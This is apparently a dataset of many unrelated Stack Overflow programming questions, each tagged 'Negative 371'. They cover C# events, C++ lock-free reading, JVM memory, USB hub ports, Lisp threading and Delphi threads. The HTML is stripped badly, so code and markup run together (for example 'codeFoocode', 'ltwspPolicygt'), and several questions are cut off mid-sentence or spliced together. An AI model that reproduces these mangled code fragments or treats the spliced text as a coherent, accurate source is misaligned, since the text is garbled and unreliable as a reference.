CallIncomingEventHandlerCurrentVCONFCallIncoming      same for other events     ...  codepre  pSo, what Im really asking here is, whats emtheem or your preferredconventional way for chaining events through layersabstractionsp  pWhat Im doing works, but I cant help feeling like doubling up and chaining events in a row isnt the best way to do it.p  pThanks in advance.p

Negative 371 pIm trying to implement a minimalistic synchronization mechanism where theres an object contains some value of type codeFoocode, this codeFoocode may potentially be a heavyweight type, but rarely changes its value. the object may be accessed from multiple threads, almost 100 reads.p  pI am trying to think of a way to make this work without any locking requirements on the readers. My first attempt was to have my class contain the codeFoocode through a shared pointer member of type codestdsharedptrltFoogtcode. The read operations would simply copyconstruct the shared pointer, dereference it, and then use this version of the value to do whatever they want.p  pThe write operations are supposed to apply their changes into a new copy of Foo, and once done, attempt to replace the current version of codeFoocode with a new one.p  pI realized this is not possible with codesharedptrltFoogtcode since the copyconstructor could get into a readwrite race with something trying to update it, and read a corrupted value.  I could get around this problem using codeboostintrusiveptrltFoogtcode with an atomic counter and doing the version update with a CAS operation, but theres still a race condition I cant get rid of the reader can be suspended just before calling codeintrusiveptraddrefcode on an instance thats about to get destroyed by another thread that lowered the count to 0.p  pIt seems like something is fundamentally broken with this approach. p  pIs there any way to accomplish this that doesnt rely on a critical section, readerswriter lock or a fullblown RCU readcopyupdate Maybe Im missing something simple. Platform is Win7x86x64.p

Negative 371 pConsider following simple structurep  precodestruct Struct  public   char  a   short int b   char  c  codepre  pIf instances of this structure are placed at an even 16bitaligned address, two padding bytes are required to fix the alignment both for codebcode and for any following instance in an array.p  pHowever, instances emcouldem be placed at an odd address, and then alignment would still be correct even with no padding bytes.p  pSo I made a test and observed Visual C 2010 will add those two padding bytes and this indicates it always places them at even addresses.p  pWhy wouldnt VC place them at odd addresses, saving 2 bytes per each object Is there something Im not aware ofp

Negative 371 pstrongShort questionstrong is there a PMML interface for Java, Python or any other major programming language that supports SVM modelsp  pstrongBackgroundstrong I have trained an SVM model in R using the codeksvmcode function from the codekernlabcode package. Now I would like to use this model in a different piece of software. To export it from R, I think I could use PMML Predictive Model Markup Language via the codepmmlcode package for R.p  pHowever, I cant find any library for Java, Python, or basically any language that allows for importing such a model. a hrefhttpwww.dmg.orgproducts.html relnofollowThe Data Mining Groupa lists quite a few PMML interfaces, but these are mostly specific tools for statistics. There is also the a hrefhttpwww.csie.ntu.edu.twcjlinlibsvm relnofollowlibsvma general library, but it is not clear how this can be used to migrate models from one to another interface.p

I am using VC10 compiler along with CUDA 4.2. The device is well installed and devicequery passes the tests. I also have written programs in CUDA which leaves me no choice but to say that OpenCV has problems with GPU. The real problem is an access violation when I try to get an instance of CascadeClassifierGPU. Also, getCudaEnabledDeviceCount returns zero. I have compiled OpenCV with CUDA flag on and there was no serious problem during the compilation only a python interface failed which is absolutely nonrelevant to GPU. Is there anyone out there who actually succeeded in running a face detection code with haar features on a GPU with OpenCV Can you give me a hint about what I am missingp

Negative 371 pPosts 53   posted Today 14838 PM  0br I am developing a jaxws web service proof of concept in RAD 8.0.4 and running in WebSphere 7. Our app uses Spring and Hibernate, but were not exactly experts in either. We need to enable global transactions with our web service so it can work with the transactions of client apps. I followed the insctructions I found on various websites, including IBMs, and I thought I configured everything and it doesnt work. Each transaction client and service work fine independently, but I forced an exception before commit in my client. This rolls back the client transaction, but not the service transaction. Furthermore, the logging on websphere not the simply systemout one...the trace from the admin console spits out some gobbledygook that implies to me that no transaction context was offered from the client. p  pI initially set the policies in both the services view of RAD and the admin console, but Ive since read that if you set both, it doesnt work. But I have since tried just one and just the other and neither work. Heres what i did p  pIn my wsdl I added p  precodeltwspPolicy wsuIdATPolicygt      ltwspExactlyOnegt          ltwsat11ATAssertiongt          ltwsat10ATAssertiongt          lt omitted assertions gt      ltwspExactlyOnegt    ltwspPolicygt   codepre  pand the wspPolicyReference line p  precodeltbinding nameTxPortBinding typetnsTxDelegategt    ltsoapbinding styledocument transporthttpschemas.xmlsoap.orgsoaphttpgt    ltoperation nameinsertDBTransgt     ltwspPolicyReference URIATPolicy requiredtruegt            ltsoapoperation soapActiongt      ltinputgt        ltsoapbody useliteralgt      ltinputgt      ltoutputgt        ltsoapbody useliteralgt      ltoutputgt    ltoperationgt    ltbindinggt   codepre  pIn the admin console version, after importing the WSTransaction policy, I navigated to ServicesService ProvidersTxService, and selected the checkbox of all three level, TxService, TxPort, and insertDBTrans. Chose Attach Policy SetWSTransaction. Click the disabled link on the service, and chose exported WSDL. Ok amp Save. p  pThen to ServicesService ClientsTxService. Check client, Attach Client Policy SetWSTransaction. Client and provier policy chosen. p  pBut that didnt work. So I remove them, and instead go into the services view of RAD. Right clicked on the service, manage policy sets. Put WSTransaction on the first page with Provider Sample as binding attached. Its set all the way down to the operation name  insertDbTrans. p  pUnder the client in the services view I set the client to user provider policy, second page, chose WSTransaction for the default entry and it set to client and provider. p  pI actually tried more permutations than this. But none of them worked. p  pAny ideas what I am doing wrong here Or at least a narrowing down of the general problem Am I close to rightp

Negative 371 pAs part of our deployment process, we use SMO to create SQL jobs programmatically on the server as part of the configuration needs to be dynamic, and it also makes the entire process automatic for us.

Negative 371 pThe USB 2.0 standard supports the disabling of individual hub ports. I am looking for an API to call from user code under Windows 8, specifically to disable hub ports, either in C or in C, using existing Windows usermode drivers. p  pIt looks like the IOCTL to disable a hub port has been deprecated in the WDF.p  pIve built and used DevCon  it will disable devices through the DDK, but will not disable hub ports.p  pWinUSB is a powerful interface, which requires specifying WinUSB.sys as your driver stack. However, I dont think its libraries, setupapi.lib and winusb.lib, provide this level of hub control.p  pI would really appreciate a pointer to the correct usermode API in Windows 8, especially a C interface. If no such API exists, that would also be very helpful to know.p  p Added 63  Since no information on this has turned up, were now looking into a softwarebased bankswitching algorithm that disables and reenables the devices directly. We hope to be able to build this out at an arbitrary size, but of course the technology is unproven at this point. Ill keep this thread up to date with progress.p

When I did that, the runtime started telling me that fileProcessor was not serializable.  Ive tried to make it serializable, but the message is still there.  p  pThere are three different bean classes and four different beans loaded under fileProcessor Ive been over all of them to ensure they are serializable, but the message still appears.  The message also appears to indicate that the log4j Logger is the nonserializable entity, but I cant see how that is.  I made it transient in one pass, no difference.p  pThe standard answers to the serializable problem I find on SO and elsewhere involve moving making a call within the job bean to the job execution context, passing in the reference through SchedulerContextAsMap.  But, as near as I can tell, this depends on having globally unique names for the parameters to which to load the globally unique bean names, which doesnt work as I have this set up.  I reuse the parameters since I reuse the bean itself.p  pIm new to Spring design, but I thought this was the way it was supposed to work  reusable components, configured with XML to avoid having similar classes slightly modified to do different things.  So how can I make my 4 jobs work  Do I have to copyandpaste them, then slightly modify the names so theyre different, and unique in the configuration  Or is there some other piece I am missing and can use herep

However, during this time I will still need to be doing bug fixes along the way. p  pIm trying to understand logically how this can be done.

Negative 371 pI have been practising algorithmic questions and I came across this one.br Given an arrayof both ve and ve numbers, I have to find a contiguous subarray such that, the sum is divisible by any number K, and the subarray should be of possibly maximum sum.

But this would be an exponential algorithm.br EDIT is it possible to solve this in Linear Time. Please Helpp

Negative 371 pIm using ViewPager that holds 3 fragments, each fragment loads a list. The problem is when the application runs for the first time and I swipe to the next fragment, this fragment needs sometime to load about 2 seconds before its view is visible. This is a very weird behavior. All I want is once the app has started, all fragments in ViewPager should be ready for user so when they swipe through fragments, theres no wait time. How can I do that p

Negative 371 pWe have performed a server migration from Solaris SunOS 5.10 to Redhat Linux VM recently. JVM was upgraded from 1.5.022 32bit to 1.6.006 64bit However, since then, we encounter OutOfMemory error frequently. We have studied that a 64bit JVM would require 30  50 more heap, so we increased our heap size from 1200MB to 2048MB and have a try. However, we still observed some OOME occured after server run for a few dates.p  pUpon checking the GC log, we found that Full GC happened frequently after server has started for few dates, and for each Full GC,  it will only release a little memory and frequent Full GC slows down the application.p  pAs you can see the excerpt of the GC log, almost no memory was released in PSOldGenp  precode205023.895 [Full GC [PSYoungGen 225919Kgt157256K240960K] [PSOldGen 1841151Kgt1841151K1841152K] 2067071Kgt1998408K2082112K [PSPermGen 108720Kgt108720K109056K], 6.2785770 secs] [Times user6.23 sys0.01, real6.28 secs]  Heap after GC invocations1638 full 251  PSYoungGen      total 240960K, used 157256K [0x00002aab2e800000, 0x00002aab3e200000, 0x00002aab3e200000   eden space 225920K, 69 used [0x00002aab2e800000,0x00002aab38192208,0x00002aab3c4a0000   from space 15040K, 0 used [0x00002aab3d350000,0x00002aab3d350000,0x00002aab3e200000   to   space 15040K, 0 used [0x00002aab3c4a0000,0x00002aab3c4a0000,0x00002aab3d350000  PSOldGen        total 1841152K, used 1841151K [0x00002aaabe200000, 0x00002aab2e800000, 0x00002aab2e800000   object space 1841152K, 99 used [0x00002aaabe200000,0x00002aab2e7fffc8,0x00002aab2e800000  PSPermGen       total 109056K, used 108720K [0x00002aaaae200000, 0x00002aaab4c80000, 0x00002aaabe200000   object space 109056K, 99 used [0x00002aaaae200000,0x00002aaab4c2c3f8,0x00002aaab4c80000    codepre  pHere is the heap usage pattern for a single OC4J instance within 24 hours, which is quite strange to me, it doesnt show a zigzag path but instead, some random pattern. img srchttpi.stack.imgur.comBqytl.png altenter image description herep  pMay I know what can I dop  pServer configp  precodeRed Hat Enterprise Linux Server release 5.7 Tikanga 2.6.18 274.el5 64bit CPU  8, 16GB RAM JVM version  JavaTM SE Runtime Environment build 1.6.006b02 Application server  OC4J 10.1.3.5 codepre  pJVM starup argumentsp  precodeOld confing server Xms1200M Xmx1200M XXMaxPermSize64M XXPrintHeapAtGC XXPrintGCDetails XXPrintGCTimeStamps Xnoclassgc verbosegc XXNewSize250M XXMaxNewSize250M XXSurvivorRatio15 Xconcurrentio Xss128k  New config server Xms2048M Xmx2048M XXMaxPermSize256M XXPrintHeapAtGC XXPrintGCDetails XXPrintGCTimeStamps Xnoclassgc verbosegc XXNewSize250M XXMaxNewSize250M XXSurvivorRatio15 Xconcurrentio Xss128k codepre

Negative 371 pThe description of the problem I am currently trying to find a lispyworking solution forp  pA jobqueue provides a set of equal by their code threads with tasks they shall take care of. If the queue is empty the threads shall wait until a new entry has been made, but I also want to provide a clean shutdown. Therefore even while waiting for the queue, it has to be possible for the motherthread to set some variableto call the threads and tell them to shut down. The only reason they would not comply directly should be that the thread is currently evaluating a tasks and therefore busynot able to make a clean shutdown until the task is done.p  pI currently got two solutions I am not really convinced byp  precodedefparameter killyourself nil  defparameter mutex sbthreadmakemutex  defparameter notify sbthreadmakewaitqueue  the queue is thread safe defparameter jobqueue makeinstance queue   defun fillqueue withdata    fillstuffinqueue    sbthreadwithmutex mutex      sbthreadconditionnotify notify   solution A withmutex mutex   do currjob nil       killyourself nil     if isempty jobqueue     sbthreadconditionwait notify mutex     progn       setf currjob dequeue jobqueue       dostuffwithjob   solution B defun helperkillyourselfp    sbthreadwithmutex mutex      killyourself  do job dequeue jobqueue timeout 0        dequeue jobqueue timeout 0         if helperkillyourselfp          t                  sbthreadwithmutex mutex                      sbthreadconditionwait notify mutex                      if helperkillyourselfp                           t                           nil          progn            nil      dostuffwithjob codepre  pBoth doloops could be used to start threads. But A would not really work if there is more than one thread as the mutex would prevent any parallel action taking place, and the B solution looksis quite dirty as there is the possibility of sidecases where the extracted job is nil. Furthermore I am not really convinced by the haltcondition, as it is too long and seems to complicated.p  pWhat would be the proper way to implement a doloop which works on data provided by a queue as long as it is supposed to and is also able to sleep as long as there is no new data and as long as it is not supposed to shut down Last but not least it has to be possible to use this doloop in an unlimited amount of multiple parallel threads.p

I ran it once, and nothing happened. I went away, watched some tv and still nothing happened. IDLE wouldnt let me quit the programme or anything. So I restarted and tried again, this time adding in a counter to see if my code was running. I run the code and the counter starts going. Until it hits 78902, the size of my dataset. Then it stops and does nothing. I cant do anything nor can I close the window.p  pThe annoying thing is is that it doesnt even get past reading the CSV file, so I havent been able to manipulate my data whatsoever.p  pHere is the code where it gets stuck the very first part of the codep  precode    empty variable to put the list into         lst  []      List function enables use for all files     def createlist          find the file         file2  inputenter filepath         read the file and iterate over it to append into the list         with openfile2, r as f             reader  csv.readerf, delimiter,             for row in reader                 lst.appendrow         return lst codepre  pSo does anyone know a way for me to make my data more manageablep  pEDIT for those interested here is my full codep  precodefrom tkinter.filedialog import asksaveasfile import csv  newfile  asksaveasfile  lst  []  List function enables use for all files def createlist     empty variable to put the list into     find the file     file2  inputenter filepath     read the file and iterate over it to append into the list     with openfile2, r as f         reader  csv.readerf, delimiter,         for row in reader             lst.appendrow     return lst   def removespacelst     lstgtlst     Returns the postcode value without any whitespace      gtgtgt ac45 6nh     ac456nh     The above would occur inside a list inside a list          filetype  inputIs this a sale or crime      num  0     check the filetype to find the position of the postcodes     if filetype  sale         num  3         iterate over the postcode to add all characters but the space     for line in rangelenlst                 pc           for char in lst[line][num]             if char                    pc  pcchar         lst[line][num]  pc  def writenewfilelst, newfile     lstgt.CSV file     Takes a list and writes it into a .CSV file.          writer  csv.writernewfile, delimiter,     writer.writerowslst     newfile.close   conversion function def findcoordpostcode      lst  createlist     create python list for conversion comparison     printlst[0]     empty variables     long  0     lat  0     iterate over the list of postcodes, when the right postcode is found,      return the coordinates.     for row in lst         if row[1]  postcode             long  row[2]             lat  row[3]     return strlong strlat  def findallcoordpostcode, file      empty variables     long  0     lat  0     iterate over the list of postcodes, when the right postcode is found,      return the coordinates.     for row in file         if row[1]  postcode             long  row[2]             lat  row[3]     return strlong strlat  def convertpostcodes          take a list of lst  []     find the file     file2  inputenter filepath     read the file and iterate over it to append into the list     with openfile2, r as f         reader  csv.readerf, delimiter,         for row in reader             lst.appendrow          save the files into lists so that they can be used     postcodes  []     with openinputenter postcode key filepath, r as f         reader  csv.readerf, delimiter,         for row in reader             postcodes.appendrow     printenter filepath to be converted     file  []     with openinputenter filepath to be converted, r as f         reader  csv.readerf, delimiter,         for row in reader             file.appendrow     here is the conversion code     long  0     lat  0     matches  0     for row in rangelenfile         for line in rangelenpostcodes             if file[row][3]  postcodes[line][1]                 long  postcodes[line][2]                 lat  postcodes[line][3]                 file[row].appendstrlong,strlat                 matches  matches1                 printmatches     finalfile  asksaveasfile     writenewfilefile, finalfile codepre  pI call the functions individually from IDLE so I can test it before making the programme run them itself.p

Negative 371 pI am using CoreBlueTooth API to write data into a peripheral we have received from some hardware manufacturing company.

Negative 371 pIm working on an assignment that requires me to store a linked list of with nodes that hold a data of any object type. Currently I am building the class with the object type set to Employee which Ill post below to simplify the process. After I get all the functions down then Ill convert it into a template.p  pMy problem is I have a merge function that takes two sorted lists and then merges them into the calling object list still sorted. I set up debugging statements first second third and fourth just to see which loops were being entered and the cmd prompt goes into an infinite loop of printing fourth. Its as though neither list ends up with nodes that  NULL, as though they never run off the end... its quite confusing.

Thats why Im posting the rest of the class code here below I expect it will be asked for. The thing is though I dont see any connections with any other functions within the class. The test driver I use insert and remove but its with a node that falls within the center of the list so it wouldnt fuck up any pointers to NULL that exist on the end...

I have already managed to retrieve the information from the database and to update records implementing Member as a case class and using the case class copy method, as shown below but I have some hard time finding the best way to implement member modification in a natural way.p  pI have contemplated 2 possibilities   1 Maintaining immutability of class instances and implementing a general setter see code 2 Making the constructor parameters vars what would suppress immutability, and therefore not idealp  pSticking with option 1, I came up with the following code excerpt, not the whole source p  precode    case class Memberid Int, name String, firstname Option[String]  None,       birthDate Option[Date]  None, gender Option[String]  None, country Option[String]  None,       healthNotes Option[String]          Just a try so far       def setn String  name, fn Option[String]  firstname, bd  Option[Date]  birthDate         implicit session Session            val m  this.copyid,n,fn,bd         Members.updatem         m                  object Members extends Table[Member]clubmembers          with CayenneAutoPKSupport         def id  column[Int]MemberID, O.PrimaryKey  This is the primary key column       def name  column[String]Name       def firstname  column[Option[String]]Firstname       def birthDate  column[Option[Date]]BirthDate       def gender  column[Option[String]]Gender       def country  column[Option[String]]Country       def healthNotes  column[Option[String]]HealthNotes         Every table needs a  projection with the same type as the tables type parameter       def   id  name  firstname  birthDate  gender  country  healthNotes ltgt Member.apply , Member.unapply   codepre  pThis works as intended but I would like to have the same names for the named parameters of the set method what would made the invocation more natural.

Negative 371 pI am trying to write a class with two inputs and one output. The class is called 10 times a second. One of the inputs is a list which does not change with time, but the other input changes with time.p  pThe outputs of this class are the members of the input list. The class should look like something like this.p  precodeimport lib601.sm as sm  counter  0 class FollowFiguresm.SM     def initself, waypointsList         self.waypoints  waypointsList     def getNextValuesself, state, inp         global counter         sensors  inp         currentpoint  sensors.odometry.point           if counter  0             while notself.waypoints[0].isNearcurrentpoint, 0.01                 return state, self.waypoints[0]             counter  1         if counter  1             while notself.waypoints[1].isNearcurrentpoint, 0.01                 return state, self.waypoints[1]             counter  1         if counter  2             while notself.waypoints[2].isNearcurrentpoint, 0.01                 return state, self.waypoints[2]             counter  1                         if counter  3             while notself.waypoints[3].isNearcurrentpoint, 0.01                 return state, self.waypoints[3] codepre  pSo the class must check a condition which changes with time, if that condition is not satisfied return inp[0] and wait until it is satisfied and do not check other conditions. if the condition is satisfied for inp1[0] go to the next while, and on the next call of this class do not check the previous whiles. I have been thinking on this for the past 5 hours and can not figure out how to solve it. It should not be that hard. Maybe I can not concentrate good enough.p  pI have tried to write a for loop for this, but since this class is called 10 times each second in some cases it does not have the output it should have, because the iteration is reset each time it is called. BTW this class should work for any finite lenght inp1.p  pEdit The above code works good for an input list with 4 elements.p

Negative 371 pI have written a program that parses an .xml file and generates various outputs. The .xml file is basically a domainspecific language, that succinctly represents the parameters of the generation. Ive also created the related .xsd schema  which provides the users of the code generator with autocompletion in most major IDEs Visual Studio even in the free express edition  Eclipse, NetBeans, etc.p  pFor example, when my users type ltReport and hit Ctrlspace, they see the available attributes and their typesp  precodeltReport Ctrlspace    fontHeightInDotsxsdinteger    isLandscapexsdboolean    ... codepre  p...etc  that is, the IDEs show the available options at the specific place in the file elementsattributes. This helps tremendously in creating the aforementioned .xml files, especially given the fact that some of the people doing the editing are analysts, not  developers.p  pIn the two example attributes shown above, it is pretty clear what each attribute is for I have used lengthy names to that effect. However, in other cases, the name is not enough  and I would love it if I could provide a sort of help string in the .xsd, that the editors can show next to the attribute descriptions during autocompletion suggestion showing... For example, for the attribute height I would love something like helpstring in the .xsdp  precodeltxsdattribute name  height helpstringHeight of the associated field macroflobber in foobared units use  optionalgt     ltxsdsimpleTypegt         ltxsdrestriction base  xsdintegergt             ltxsdrestrictiongt          ltxsdsimpleTypegt     ltxsdattributegt codepre  p... and have the IDEs show the emhelpstringem when the autocompletion suggestions come up. p  pIs there anything like that in modern IDEss support for .xsd.xmlp

Negative 371 pI have 2 Android devices, which I would like to connect with a USB OTG cable and have backandforth communication between the two devices.  From what I understand, one Android device will act as the USB Host Nexus 7 running 4.4 and the other Android device will act as a USB Accessory Galaxy Nexus running 4.2.2.  Ive tried googling around for an answer, but I can only seem to find articles explaining how to connect an Android device to a USB accessory like a USB mouse or keyboard, not how to treat an Android device as the USB accessory itself.p  pSo, following a hrefhttpdeveloper.android.comguidetopicsconnectivityusbhost.html relnofollowthisa page, I have configured an app on the Nexus 7 to be the USB Host.  I can find the connected Galaxy Nexus based on its product id amp vendor id, form a connection to the Android Open Accessory Protocol and successfully connect over USB.  From what I can tell, the Nexus 7 can successfully send bytes to the Galaxy Nexus.p  pMy question is how to access this connection on the Galaxy Nexus side.  I have added permissions and the USB filter into the manifest, so the desired app opens on the Galaxy Nexus once the USB connection is established, but I cant figure out how to receive the data coming in from the Nexus 7 or how to send data from the Galaxy Nexus back to the Nexus 7.p  pAny help would be greatly appreciated  Thanksp

Negative 371 pIm sorry to bother you with this question but I end up finding a head stomper, and I am wondering if Im dealing with this the wrong way.p  pI want to map a class containing a collection of codeorg.springframework.security.core.authority.SimpleGrantedAuthoritycode so that I dont need to send it eagerly loaded by the ORM, into the spring security classes. But its role attribute is associated with the getter getAuthority, and that is when Orika means trouble. Can I force Orika to use the values returned by a getter, to put it into a setter of the destination classp  pIf you care enough, heres a little context ot my problem.  Im using Spring security for an app. I have a service which returns a codeorg.springframework.security.core.userdetails.UserDetailscode so that spring can check if the user is authenticated and it has permissions. The implementation of UserDetail we have is a local one named codeUsercode. Since this class implements codeorg.springframework.security.core.userdetails.UserDetailscode, it has the method codepublic Collectionlt extends GrantedAuthoritygt getAuthoritiescode which returns the permissions for this user.p  pEverithing was well, except for the fact that we had this codeUsercode in the database, handled with hibernate. The first choices where to leave an open session in view. We dont want that. The second choice was to make the fetching of the ORM, EARGER. We didnt want that either. So, we decided to use a DTO, implementing UserDetail, and map it with orika. Thats when all hell broke loose. codeorg.springframework.security.core.GrantedAuthoritycode is an interface. The concrete class we are using is codeorg.springframework.security.core.authority.SimpleGrantedAuthoritycode. And this is an obscure and deadly class to map, because it has an attribute name role, but its getter is getAuthorityp  precodepublic String getAuthority      return role  codepre  pIt appears that the Spring team and the Orika team where not very close friends. Otherwise they wouldve name the property, according to the java standard, and orika wouldve mapped it straight forward. I am, also, reluctant to define a custom mapper for this particular case, and thats whats been bothering me. Is there any known way of forcing Orika to use the value returned by the getter method other than replacing all its magic with a custom mapper for a particular classp

In addition, the jitter in the result increases after those 72 hours.p  pAny explanationsp  pNext steps will be changing to fixed step solver Might well be this is a big part of the solution Changing from DDE Server to OPC Server, which at the Moment doesnt not seem to be possible in Dymola 2013 however.p  pEdit 3 img srchttpi.stack.imgur.comrB9bg.jpg altRelative Simulation time deviation with fixed step solverp  pNope... using a fixed step solver does seem to solve the problem.

I understand what you are saying, but that would go back to point 1 that I made above. It is a massive security risk to allow this. Essentially, someone could easily hack a file upload and have it execute as root  in a few minutes I could delete all your backups, download all your databases, wipe out your file system, change the root user password, wipe out the Kernel and reboot the server. The Apache user has no shell access, so shipping and executing a file via that user is one of the best ways to protect your web server.

Negative 371 pI hope you wont vote my post down cause I dont have code to show for but its a very general question. When I do a curl call to paypal, rather I get a response back or not, curlgetinfo returns 0. I am getting a intermitten resposne. sometimes I get a response, sometimes I get false, but in either case, I get no error number or getinfo. p  pSo I guess my question is... Is this issue a common issue, is there a setting I can use to get getinfo to actually return somethingp

Negative 371 pa hrefhttppastebin.comafsNHhCu relnofollowhttppastebin.comafsNHhCua Im only including the code because people always ask for it. This code will not compile right now though p  pI wrote up a small crawler game not really a game yet though, and Im having an issue with the function that looks up whats on a given square.  A wrote a function, searchcoord, that searches the database to see if an object is on a given square, and returns whatever it finds. It worked fine when I was only dealing with a few simple classes, but Ive tried incorporating inheritance since then, and I cant figure out how to make it work now. p  pOriginally, the return type of searchcoord was Objectamp Object is a base class that most other classes are derived from. I stored all the objects in a database in the form of vector of Objects.  I needed to create a couple more databases though for Npcs and graphics, and I thought that because Object is a base class, searchcoord would be capable of returning derived classes as well apparently the not.p  pI tried overloading searchcoord to deal with different derived types, but the only difference is the return type, and you cant overload based on that.  Then, I tried using a functor which is in the code above. This almost works, except that the overloaded null operator isnt capable of taking arguments, which are required for the function to work. The only way around that I could see was to internally incorporate the arguments into the searchcoord functor, and change them separately every time I need to call searchcoord. That seems like an over complicated idea, so Im probably going to scratch the functor all together.  If searchcoord was a member of Object, it would be easy. I could just make it virtual, and redefine it in all derived classes if I understand its use correctly. The problem is, it has to be as far as I can tell a member of database. I tried making it a member of Object, but realized that I wasnt sure what instance of Object to call the function on given the purpose of the function is to find an instance of Object.p  pAny help here would be much appreciatedp  pI just had an idea while writing this. Could I make the searchcoord function virtual static, so that Im not calling any 1 instance of Object to use itp  pThank you p

Negative 371 pWe have 1 user that when they run a stored procedure from a VB application, it runs an old version of the SP.

The error they get is not important because it has been fixed but it is like this 1 user is calling a different SP.p  pTo makes thing more confusing, we had the same issue a few months ago with a different database and vb app and 2 different users.  What we did to fix their issue is remove them from active director and then add them with a different name.p  pDoes anyone have any idea of what might be happening, something else I could try instead of recreating the user, or has anyone else ever ran across this  Please tell me I am not insane.p  pstrongEDITstrong We changed the name of the SP in both the VB app and in SQL Server and watching SQL Profiler, it does run the renamed SP but it still runs the old code that was in the SP.

END codepre  pSo we added raiserrorThis is the updated SP with an error,16,1 on the line after SET NOCOUNT ON and the user still got the error about not having access to BULK INSERT but everyone else got the error we were raising.p  pThen I created a table that has these four paramanters in them and replaced the RAISERROR with some insert SQL. The one user gets the BULK INSERT error and no record in the table, everyone else inserts the record and runs the process without error. In SQL Profiler, all the exec statements are the same.p  pBTW, SQL Profiler shows thisp  precodeexec BulkLoadSomeData UserNameUser1, FileNameUNC Path and file name with no special characters, OriginalFileNameLine the other file name codepre

When hovering from top to bottom the menu works fine and replaces images exactly as it should.p  pBut then after hovering another link I cant go back up on the menu as the links are not active as they must be hiding due to the top margin or something like that.p  pYou can see the menu at the bottom of the page the blue buttons which turn red at the very bottom of the pagep  pa hrefhttpwww.israelijewel.com1.html relnofollowhttpwww.israelijewel.com1.htmlap  pThank you in advancep

But I still have some confusion about how the dependencylinkage actually works. Specifically I would like to be walked through the process that the makefile compiles and runs. example, the compiler first looks at main.c, starting from line 1, which is main.h, goes into main.h, starting from line 1, which points to function1.h, and so on.p  pMy main question here is though is it true that compilermakefile operates in a backwards way, that is once the compiler reaches the last stop no more link, it started to gather the content recursively and put it in the object file. And what happens if we have multiple object file and the connect is crosslinked Should each object file be independent from each otherp  pBelow is my final result.

One of the fields needs to be trimmed to 30 characters, so we us codembsubstrcode as followsp  precodeparamsgtRequestgtDescription  mbsubstrtitle, 0, 30, UTF8 codepre  pWe instantiate the codeSoapClientcode object as followsp  precodeclient  new SoapClient                     wsdlUri,                     array                         trace gt 1,                         exceptions gt true,                          cachewsdl gt WSDLCACHENONE,                          soapversion gt SOAP12,                          encoding gt UTF8                                       codepre  pMy understanding is that this will tell codeSoapClientcode that strings will be provided in UTF8 format, and when we trim to 30 characters we are doing it to 30 UTF8 characters, and not 30 bytes.p  pcodeSound of Contact  Mbius Slipcode is being sent as codeSound of Contact  Mbius Slipcode. codeCall of Duty Ghosts Gold Editioncode is being sent as codeCall of Duty Ghosts Gold Edicode. I can see with these that we have 31 characters here, which is why the remote service is rejecting the call. If the title is less than 31 characters then it goes through fine, even when characters are mangled by the encoding.p  pWe know that codetitlecode is OK, because we send this the whole thing to other sources via SOAP with no problem it is stored in the remote system and is displayed correctly.

Negative 371 pHave not been able to find anything that fits my needs.p  pI have two columns of values L and U. Column L contains a file names that includes a date in MMDDYYYY format example yadayadayada thru 03152015.pdf column U contains a date. What I need to do is have a macro compare the date within the file name to the date in the column U. Other dates may appear within the text in column L but the date I need to compare against is always after thru and in parentheses followed by the file extension.  If they do not match, I need the value in column U highlighted and replaced with the text FAIL. Im going to continue searching but any help is greatly appreciated. Thanksp

Negative 371 pI am dynamically generating two paragraphs and two input fields inside a div. There may be numerous divs generated, depending upon the number of records pulled from the database. Each para and input field is assigned a unique id.  When the user clicks on a field, say firstTextid, jQuery hides the field and shows an input field firstTextinputid in its place. The user updates the input field, and on clicking away, an ajax script is called to update the database and return a success message. My problem is that, when the user clicks on one field in any record, and updates it, then clicks away, the ajax calls for both fields are made.p  h1PHPh1  precodeecho ltdiv classsingle seven columns boxTable2   idvidgt         ltdiv classseven columns alpha omega gt         ltdiv classfour columns alpha omega  gt            ltp classsingle two columns alpha omega firstHeadgtFirst name ltpgt            ltp classfirstText single two columns alpha omega idfirstTextvid                   datavidvidgtfirstltpgt            ltinput typetext idfirstTextinputvid                    classfirstTextinput single two columns                   datavidvid valuefirstgt              ltdivgt              ltdiv classfour columns alpha omega  gt          ltp classsingle two columns alpha omega lastHead gtLast name ltpgt           ltp classlastText single two columns alpha omega idlastTextvid                  datavidvidgtlastltpgt         ltinput typetext idlastTextinputvid                 classlastTextinput single two columns                datavidvid valuelastgt            ltdivgt         ltdivgt    ltdivgt codepre  h1jqueryh1  precodejQuery.noConflict jQuerydocument.readyfunction      var vidID        document.onclick, .firstText, function             vidIDthis.datavid          firstTextvidID.hide          firstTextinputvidID.show     .changefunction              var newFirstTextfirstTextinputvidID.val         var firstTextDataString  vid vidID ampfirstnewFirstText          ifnewFirstText.lengthgt0                      .ajax                 type POST,                 url gotophp.php,                 data firstTextDataString,                 cache false,                 success functionhtml                                      firstTextvidID.htmlnewFirstText                                        else                      alertEnter something.

When I used his code, it worked fine, but once I tried to use some images from my server, it didnt work again. Using Chromes web dev tools, I looked at the frames resources. The images in the carousel arent considered images Or at least they arent included in the images folder. They are in the Others folder. They are still a code.jpgcode file, but Chrome sees them from the resource and elements perspective as a blank image with 0 width and 0 height 0px x 0px. When I double click on the image in the resources, Chrome opens the image in another window and it shows it fine.p  pThis completely baffles me and I have no idea what is going on.

Negative 371 pI am using codePrintDocument.Printcode to start a print process, in which I print a data grid C1FlexGrid and some header and footer information.

Negative 371 pI have the following scenariop  pThe program I am writing simulates multiple air networks. Now I have written it so that each simulation is in its own thread with its own data. This is so that there can be no contamination of data and each thread is complete multitasking safe. I have implemented delphis native TThread class for each thread. p  pThe program has one main thread. It then creates multiple sub threads for each network my current test case has 6. But each sub thread also has 4 additional threads since its network has more than one layout. So in total I have 31 threads, but only 24 threads actively processing. All threads are created in suspended mode so that I can manually start them. p  pThe computer I am running on is an i5 laptop so it has 4 threads 2 physical cores  2 HT. In the production environment this will run on servers so they will have more processing power. p  pNow in the main program thread I have added a break point after the for loop which executes the threads. This doesnt trigger immediately. Watching the debug console of Delphi, it looks like it is only actively running 4 threads at a time. As soon as one exits, it starts another thread. p  pThe simulations in the threads are difficult to optimize and require a few loops to finish the simulation. And each loop requires the previous loops data. But each simulation is completely independent of the next so the program is an excellent candidate for threads and pipe lining. p  pNow my question is why does it only start 4 threads and not all the threads as the code specifiesp  pEDIT Added pieces of codep  pMain program p  precode    for i  0 to lengthSolutions1 do     begin         Solutions[i].CreateWorkers  Setup threads      end     for i  0 to lengthSolutions1 do     begin         Solutions[i].Execute   start threads     end end  isSolversBusy  false    breaking point doesnt trigger here codepre  p1St level of threadsp  precodeprocedure cSolution.Execute var i  integer lIsWorkerStillBusy  boolean begin 